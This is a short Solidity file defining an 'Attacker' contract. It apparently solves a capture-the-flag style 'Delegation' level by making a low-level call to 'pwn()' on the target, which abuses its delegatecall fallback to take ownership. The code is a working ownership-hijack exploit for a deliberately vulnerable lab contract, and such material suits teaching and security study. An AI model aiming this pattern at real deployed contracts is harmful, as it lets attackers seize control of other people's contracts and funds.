// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Delegation} from "./Delegates.sol";


contract Attacker {
    
    Delegation delegation;

    constructor(address _delegation){
        delegation = Delegation(_delegation);
    }

    function attack() public {
        address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
    }
}